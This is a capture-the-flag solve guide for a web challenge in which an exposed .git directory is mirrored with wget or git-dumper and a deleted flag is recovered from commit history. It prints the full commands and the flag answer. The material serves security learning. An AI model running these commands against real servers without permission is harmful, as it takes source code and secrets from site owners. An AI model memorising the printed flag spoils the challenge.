# [Easy] Web - I Got to Git That Flag - Solve Guide

## Overview
The target web server has accidentally exposed its `.git` directory, making the full repository history downloadable by anyone. The flag was committed to the repository in a previous commit and subsequently deleted — but deleted content remains recoverable through Git's commit history.

## Initial Analysis
The challenge title and description ("someone pushed a little too much to production") hint strongly at an exposed `.git` directory. This is a common real-world misconfiguration where a developer deploys directly from a working Git repository, leaving the `.git` folder publicly accessible at the web root.

Confirm the exposure by browsing to:
```
http://<target>/.git/
```

If the directory listing is visible, or if `/.git/HEAD` returns a valid Git ref (e.g. `ref: refs/heads/main`), the repository is exposed and downloadable.

## Enumeration / Inspection
Verify exposure:
```bash
curl http://<target>/.git/HEAD
# Expected: ref: refs/heads/main  (or master)
```

Once confirmed, the entire repository object store can be mirrored locally and inspected as a normal Git repository.

## Method
- **Vulnerability:** Exposed `.git` directory on a production web server
- **Technique:** Mirror the repository locally using `wget` recursive download or `git-dumper`, then recover deleted file content from commit history using `git log` and `git show`

## Exploitation / Decryption / Solution Steps

### Step 1 — Download the exposed repository

**Option A — wget (recursive):**
```bash
wget -r http://<target>/.git/
```
This recursively downloads all objects under `/.git/`. Navigate into the downloaded directory before running Git commands.

**Option B — git-dumper (recommended):**
```bash
pip install git-dumper
git-dumper http://<target>/.git/ ./repo
cd ./repo
```
`git-dumper` handles partial or restricted directory listings more robustly than `wget`.

### Step 2 — Review the commit history

```bash
git log
```

Browse the log for any commit messages referencing the flag or a deletion event. A commit such as `"Remove flag.txt"` or similar indicates where the flag was present.

### Step 3 — Examine the target commit

Once the relevant commit hash is identified, inspect what was added or removed:

```bash
git show b67a4c042d67a362c5e0367ed00febce597dce5e
```

The diff output will show lines prefixed with `-` (deleted) or `+` (added). The flag will appear in the deleted content of `flag.txt`.

**Example diff output:**
```diff
diff --git a/flag.txt b/flag.txt
deleted file mode 100644
--- a/flag.txt
+++ /dev/null
@@ -1 +0,0 @@
-P2P{c8d20dc0dfb423ced43860a457b82db0555fe2f1}
```

**Flag:** `P2P{c8d20dc0dfb423ced43860a457b82db0555fe2f1}`

## Commands Used

```bash
# Confirm .git exposure
curl http://<target>/.git/HEAD

# Option A — Mirror with wget
wget -r http://<target>/.git/

# Option B — Mirror with git-dumper (recommended)
pip install git-dumper
git-dumper http://<target>/.git/ ./repo
cd ./repo

# Review commit history
git log

# Inspect the deletion commit
git show b67a4c042d67a362c5e0367ed00febce597dce5e
```

## Scripts Used
- [`git-dumper`](https://github.com/arthaud/git-dumper) — optional but recommended for robust `.git` mirroring
